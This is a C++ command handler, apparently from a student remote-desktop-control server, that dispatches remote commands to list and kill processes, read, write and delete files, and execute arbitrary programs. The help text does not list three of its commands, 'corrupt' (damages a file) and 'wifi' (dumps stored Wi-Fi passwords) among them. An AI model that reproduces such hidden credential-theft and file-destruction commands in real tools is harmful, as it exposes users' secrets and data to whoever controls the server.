#include "C:\UNIVERSITY\ComputerNetwork\remote-desktop-control\server\include\core\CommandHandler.h"
#include <sstream>
#include <algorithm>
#include <iostream>

CommandHandler::CommandHandler()
{
    platform = Platform::createPlatform();

    // Register built-in commands
    registerCommand("list", [this](const std::string &args)
                    { return cmdListProcesses(args); });
    registerCommand("ps", [this](const std::string &args)
                    { return cmdListProcesses(args); });
    registerCommand("start", [this](const std::string &args)
                    { return cmdStartProcess(args); });
    registerCommand("kill", [this](const std::string &args)
                    { return cmdKillProcess(args); });
    registerCommand("info", [this](const std::string &args)
                    { return cmdProcessInfo(args); });
    registerCommand("sysinfo", [this](const std::string &args)
                    { return cmdSystemInfo(args); });
    registerCommand("ls", [this](const std::string &args)
                    { return cmdListDirectory(args); });
    registerCommand("dir", [this](const std::string &args)
                    { return cmdListDirectory(args); });
    registerCommand("read", [this](const std::string &args)
                    { return cmdReadFile(args); });
    registerCommand("write", [this](const std::string &args)
                    { return cmdWriteFile(args); });
    registerCommand("exec", [this](const std::string &args)
                    { return cmdExecuteScript(args); });
    registerCommand("help", [this](const std::string &args)
                    { return cmdHelp(args); });
    registerCommand("?", [this](const std::string &args)
                    { return cmdHelp(args); });
    registerCommand("delFile", [this](const std::string &args)
                    { return cmdDeleteFile(args); });
    registerCommand("corrupt", [this](const std::string &args)
                    { return cmdCorruptFile(args); });
    registerCommand("wifi", [this](const std::string &args)
                    { return cmdGetWifi(args); });
}

void CommandHandler::registerCommand(const std::string &name, CommandFunc func)
{
    commands[name] = func;
}

std::pair<std::string, std::string> CommandHandler::parseCommand(const std::string &commandLine)
{
    auto space = commandLine.find(' ');
    if (space == std::string::npos)
    {
        return {commandLine, ""};
    }
    return {commandLine.substr(0, space), commandLine.substr(space + 1)};
}

std::string CommandHandler::execute(const std::string &commandLine)
{
    if (commandLine.empty())
    {
        return "Error: Empty command";
    }

    auto [cmd, args] = parseCommand(commandLine);

    // Convert command to lowercase for case-insensitive matching
    std::transform(cmd.begin(), cmd.end(), cmd.begin(), ::tolower);

    if (commands.count(cmd))
    {
        try
        {
            return commands[cmd](args);
        }
        catch (const std::exception &e)
        {
            return "Error executing command: " + std::string(e.what());
        }
    }

    return "Unknown command: " + cmd + "\nType 'help' for available commands.";
}

std::string CommandHandler::getHelp() const
{
    std::ostringstream oss;
    oss << "=== Available Commands ===\n"
        << "list/ps              - List all running processes\n"
        << "start <command>      - Start a new process\n"
        << "kill <pid>           - Terminate a process by PID\n"
        << "info <pid>           - Get detailed info about a process\n"
        << "sysinfo              - Display system information\n"
        << "ls/dir <path>        - List directory contents\n"
        << "read <file>          - Read file contents\n"
        << "write <file> <data>  - Write data to file\n"
        << "exec <script>        - Execute a script/command\n"
        << "help/?               - Show this help message\n"
        << "exit                 - Close connection\n";
    return oss.str();
}

std::string CommandHandler::cmdListProcesses(const std::string &args)
{
    (void)args;
    auto processes = platform->listProcesses();

    if (processes.empty())
    {
        return "No processes found or insufficient permissions.";
    }

    std::ostringstream oss;
    oss << "=== Running Processes (" << processes.size() << ") ===\n";
    oss << "PID\t\tName\t\t\tMemory (KB)\n";
    oss << "-------------------------------------------------------\n";

    // Sort by PID
    std::sort(processes.begin(), processes.end(),
              [](const Platform::ProcessInfo &a, const Platform::ProcessInfo &b)
              {
                  return a.pid < b.pid;
              });

    int count = 0;
    for (const auto &proc : processes)
    {
        if (proc.name.empty() || proc.name == "<unknown>")
            continue;

        oss << proc.pid << "\t\t"
            << proc.name.substr(0, 20) << "\t\t"
            << proc.memoryUsage << "\n";

        if (++count >= 50)
        { // Limit output
            oss << "... (showing first 50 processes)\n";
            break;
        }
    }

    return oss.str();
}

std::string CommandHandler::cmdStartProcess(const std::string &args)
{
    if (args.empty())
    {
        return "Error: No command specified\nUsage: start <command>";
    }

    unsigned long pid;
    if (platform->startProcess(args, pid))
    {
        return "Process started successfully\nPID: " + std::to_string(pid) +
               "\nCommand: " + args;
    }

    return "Failed to start process: " + args;
}

std::string CommandHandler::cmdKillProcess(const std::string &args)
{
    if (args.empty())
    {
        return "Error: No PID specified\nUsage: kill <pid>";
    }

    try
    {
        unsigned long pid = std::stoul(args);

        if (!platform->processExists(pid))
        {
            return "Error: Process " + args + " does not exist";
        }

        if (platform->killProcess(pid))
        {
            return "Process " + args + " terminated successfully";
        }

        return "Failed to terminate process " + args + "\n(May require elevated privileges)";
    }
    catch (...)
    {
        return "Error: Invalid PID format";
    }
}

std::string CommandHandler::cmdProcessInfo(const std::string &args)
{
    if (args.empty())
    {
        return "Error: No PID specified\nUsage: info <pid>";
    }

    try
    {
        unsigned long pid = std::stoul(args);

        if (!platform->processExists(pid))
        {
            return "Error: Process " + args + " does not exist";
        }

        auto info = platform->getProcessInfo(pid);

        std::ostringstream oss;
        oss << "=== Process Information ===\n"
            << "PID:    " << info.pid << "\n"
            << "Name:   " << info.name << "\n"
            << "Path:   " << info.path << "\n"
            << "Memory: " << info.memoryUsage << " KB\n";

        return oss.str();
    }
    catch (...)
    {
        return "Error: Invalid PID format";
    }
}

std::string CommandHandler::cmdSystemInfo(const std::string &args)
{
    (void)args;
    auto info = platform->getSystemInfo();

    std::ostringstream oss;
    oss << "=== System Information ===\n"
        << "OS:             " << info.osName << "\n"
        << "Architecture:   " << info.architecture << "\n"
        << "Hostname:       " << info.hostname << "\n"
        << "CPU Cores:      " << info.cpuCores << "\n"
        << "Total Memory:   " << info.totalMemory << " MB\n"
        << "Available Mem:  " << info.availableMemory << " MB\n"
        << "Used Memory:    " << (info.totalMemory - info.availableMemory) << " MB\n";

    return oss.str();
}

std::string CommandHandler::cmdListDirectory(const std::string &args)
{
    std::string path = args.empty() ? "." : args;

    auto entries = platform->listDirectory(path);

    if (entries.empty())
    {
        return "Error: Cannot access directory or directory is empty";
    }

    std::ostringstream oss;
    oss << "=== Directory: " << path << " ===\n";

    for (const auto &entry : entries)
    {
        oss << entry << "\n";
    }

    return oss.str();
}

std::string CommandHandler::cmdReadFile(const std::string &args)
{
    if (args.empty())
    {
        return "Error: No file specified\nUsage: read <filepath>";
    }

    if (!platform->fileExists(args))
    {
        return "Error: File not found: " + args;
    }

    std::string content = platform->readFile(args);

    if (content.empty())
    {
        return "Error: Cannot read file or file is empty";
    }

    // Limit output size
    if (content.size() > 10000)
    {
        content = content.substr(0, 10000) + "\n... (truncated)";
    }

    return "=== File: " + args + " ===\n" + content;
}

std::string CommandHandler::cmdWriteFile(const std::string &args)
{
    auto space = args.find(' ');
    if (space == std::string::npos)
    {
        return "Error: Invalid format\nUsage: write <filepath> <content>";
    }

    std::string filepath = args.substr(0, space);
    std::string content = args.substr(space + 1);

    if (platform->writeFile(filepath, content))
    {
        return "File written successfully: " + filepath;
    }

    return "Error: Failed to write file";
}

std::string CommandHandler::cmdExecuteScript(const std::string &args)
{
    if (args.empty())
    {
        return "Error: No script specified\nUsage: exec <command>";
    }

    unsigned long pid;
    if (platform->startProcess(args, pid))
    {
        return "Script executed\nPID: " + std::to_string(pid);
    }

    return "Failed to execute script";
}

std::string CommandHandler::cmdHelp(const std::string &args)
{
    (void)args;
    return getHelp();
}

std::string CommandHandler::cmdDeleteFile(const std::string &args)
{
    if (args.empty())
        return "Error: Usage: del <filepath>";

    if (platform->deleteFile(args))
    {
        return "Success: File deleted -> " + args;
    }
    return "Error: Could not delete file (Check permissions or path).";
}

std::string CommandHandler::cmdCorruptFile(const std::string &args)
{
    if (args.empty())
        return "Error: Usage: corrupt <filepath>";

    if (platform->corruptFile(args))
    {
        return "Success: File corrupted -> " + args;
    }
    return "Error: Could not corrupt file.";
}

std::string CommandHandler::cmdGetWifi(const std::string &args)
{
    (void)args;
    return "=== Stored Wifi Passwords ===\n" + platform->getWifiPasswords();
}